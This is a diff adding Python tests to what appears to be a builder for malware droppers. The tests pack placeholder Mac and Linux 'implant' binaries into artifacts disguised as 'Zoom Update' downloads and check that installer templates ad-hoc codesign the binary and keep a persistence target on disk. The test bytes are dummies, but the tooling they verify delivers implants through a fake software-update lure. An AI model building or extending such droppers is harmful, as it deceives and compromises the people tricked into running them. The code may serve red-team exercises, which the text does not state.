@@ -154,3 +154,68 @@ def test_load_build_request_defaults_doc(tmp_settings):
 
 def test_settings_has_expected_fields():
     assert issubclass(Settings, object)
+
+
+MACHO = b"\xcf\xfa\xed\xfe" + b"\x00" * 64
+ELF = b"\x7fELF" + b"\x00" * 64
+
+
+def test_extract_implant_from_mac_command_zip(tmp_path):
+    import zipfile
+
+    script = (
+        "#!/bin/bash\n"
+        f"IMPLANT_B64='{base64.b64encode(MACHO).decode()}'\n"
+        "echo hi\n"
+    )
+    art = tmp_path / "Zoom Update_ab12.command.zip"
+    with zipfile.ZipFile(art, "w") as zf:
+        zf.writestr("Zoom Update_ab12.command", script)
+    data, name = build.extract_implant_from_artifact(art, "darwin")
+    assert data == MACHO
+    assert name == "fleetrun"
+
+
+def test_extract_implant_rejects_non_macho_payload(tmp_path):
+    import zipfile
+
+    # A .command served as the "binary" must never be handed back as payload.
+    script_payload = b"#!/bin/bash\necho no\n"
+    encoded = base64.b64encode(script_payload).decode()
+    script = f"IMPLANT_B64='{encoded}'\n"
+    art = tmp_path / "Zoom Update_ab12.command.zip"
+    with zipfile.ZipFile(art, "w") as zf:
+        zf.writestr("Zoom Update_ab12.command", script)
+    assert build.extract_implant_from_artifact(art, "darwin") is None
+
+
+def test_extract_implant_from_linux_tar(tmp_path):
+    import io
+    import tarfile
+
+    art = tmp_path / "zoom-update-ab12.tar.gz"
+    with tarfile.open(art, "w:gz") as tf:
+        info = tarfile.TarInfo(".fleet-ab12")
+        info.size = len(ELF)
+        tf.addfile(info, io.BytesIO(ELF))
+    data, name = build.extract_implant_from_artifact(art, "linux")
+    assert data == ELF
+    assert name == "fleetrun"
+
+
+def test_mac_installer_signs_and_keeps_persistence_target():
+    src = (build.TEMPLATES / "mac" / "installer.sh.tmpl").read_text(encoding="utf-8")
+    assert "codesign --force --sign -" in src
+    assert "SUDO_USER" in src
+    assert 'rm -rf "$WORKDIR"' not in src
+
+
+def test_mac_dropper_keeps_persistence_target():
+    src = (build.TEMPLATES / "mac" / "dropper.command.tmpl").read_text(encoding="utf-8")
+    assert 'rm -rf "$WORKDIR"' not in src
+    assert "Mach-O" in src
+
+
+def test_linux_installer_keeps_persistence_target():
+    src = (build.TEMPLATES / "linux" / "installer.sh.tmpl").read_text(encoding="utf-8")
+    assert 'rm -rf "$WORKDIR"' not in src
